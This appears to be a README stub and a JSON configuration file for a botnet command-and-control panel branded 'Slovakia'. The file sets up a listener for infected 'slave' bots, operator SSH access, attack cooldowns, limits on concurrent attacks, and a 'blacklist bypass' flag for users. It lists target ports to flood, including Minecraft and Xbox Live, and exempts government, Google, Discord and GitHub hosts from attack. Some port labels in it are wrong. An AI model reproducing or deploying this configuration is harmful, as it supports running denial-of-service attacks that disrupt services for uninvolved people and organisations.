# popcorn-2
sssf
{
	"server": {
		"slave": {
			"enabled": true,
			"host": ":1024"
		},

		"ssh": {
			"enabled":true,
			"host": ":39820",

			"sshKeyAuth": true,
			"passwordAuth": true
		}
	},

	"auth": {
		"keyDerivationFunction": 2,
		"captcha": {
			"enabled": false,
			"mfa": false,
			"maxTries": 4
		}
	},

	"branding": {
		"attackSent":"Your attack has Been Launched.",
		"blacklistBlock": "You are trying to attack a blacklisted target!",
		"name": "Slovakia"
	},

	"database": {
		"host":"localhost:3306",
                "username":"X.X.X.X",
                "password":"X.X.X.X",
                "dbname":"X.X.X.X.X"
	},

	"disabledCommands": [
		"help",
		"?",
		"slovakia",
		"commands",
		"bots"
	],

	"defaults": {
		"users": {
			"maxSessions": 2,
			"attackCoolDown": 120,
			"concurrents": 2,
			
			"vip": false,
			"bypassBlacklist": false
		}
	},

	"blacklist": {
		"host": [
			"1\\.1\\.1\\.1",
			"8\\.8\\.8\\.8",
			"0\\.0\\.0\\.0",
			"1\\.1\\.2\\.2",
			"9\\.9\\.9\\.9",

			"(.*.gov)",
			"(.*.gov.uk)",
			"gov.uk",
			"(.*google.com)",
			"(.*google.co.uk)",
			"(.*discord.com)",
			"(.*discordapp.com)",
			"(.*github.com)",
			"(.*github.io)"
		],

		"username": [
			"user",
			"admin",
			"mod",
			"cnc",
			"bot",
			"slave"
		]
	},

	"ports": [
		{
			"proto": "ssh",
			"port": 22
		},
		{
			"proto": "http",
			"port": 80
		},
		{
			"proto": "https",
			"port": 443
		},
		{
			"proto": "ftp",
			"port": 20
		},
		{
			"proto": "ftps",
			"port": 21
		},
		{
			"proto": "mysql",
			"port": 3306
		},
		{
			"proto": "rdp",
			"port": 3389
		},
		{
			"proto": "smb",
			"port": 445
		},
		{
			"proto": "xboxlive",
			"port": 3074
		},
		{
			"proto": "minecraft",
			"port": 25565
		},
		{
			"proto": "gopher",
			"port": 70
		}
	]
}
